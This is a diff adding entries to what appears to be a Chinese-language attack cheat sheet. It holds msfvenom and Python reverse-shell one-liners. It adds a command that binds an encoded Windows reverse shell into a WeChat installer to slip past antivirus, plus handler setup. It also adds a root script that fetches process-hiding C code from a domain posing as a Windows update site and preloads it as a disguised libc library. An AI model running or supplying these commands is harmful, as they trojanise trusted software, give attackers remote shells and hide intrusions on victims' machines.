@@ -361,6 +361,20 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Co
 msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 msfvenom -p python/meterpreter/reverser_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
 
+msfvenom -l encoders
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.111.132 LPORT=9999 -e x86/shikata_ga_nai -x WeChatSetup.exe -i 12 -f exe -o /root/WeChatSetup1.exe
+-e /指定编码方式对攻击载荷进行重新编码
+-x /指定木马捆绑在哪个可执行程序模板上
+-i /指定对目标进行编码的次数，多次编码理论上有助于免杀的实现
+-f /指定msf编码器输出程序的格式
+-0 /指定处理完毕后的文件输出路径
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp ///选择payload为Windows/shell/reverse_tcp
+show options ///查看一下哪些选项需要配置
+set lhost 192.168.111.132 ///设置一下主机地址
+set lport 9999 ///设置下主机端口，为木马设定的端口
+run
+
 python反弹
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 php反弹shell和python的方式差不多
@@ -1201,3 +1215,25 @@ WEB安全
 https://websec.readthedocs.io/zh/latest/
 暴力破解WI-FI密码
 https://mp.weixin.qq.com/s/NvthHc_uw74NIpE6ZyA4xQ
+
+https://github.com/tor2web/Tor2web
+
+https://github.com/gianlucaborello/libprocesshider
+if [ "$EUID" -ne 0 ]  then echo "Please run as root"else
+  if [ `grep libc2.28 /etc/ld.so.preload`  ]  then echo "hideproc already done!!"
+  else
+    apt-get update -y
+    apt-get install build-essential -y
+    yum check-update
+    yum install build-essential -y
+    dnf groupinstall "Development Tools" -y
+    yum group install "Development Tools"  -y
+    curl http://m.windowsupdatesupport.org/d/processhider.c -o  processhider.c
+
+    gcc -Wall -fPIC -shared -o libc2.28.so processhider.c -ldl
+    mv libc2.28.so /usr/local/lib/ -f
+    grep libc2.28 /etc/ld.so.preload  || echo /usr/local/lib/libc2.28.so >> /etc/ld.so.preload
+    rm -f processhider.c
+    ls >/tmp/.1  2>&1
+    grep libc2.28.so /tmp/.1 && echo >/etc/ld.so.preload  fifi
+
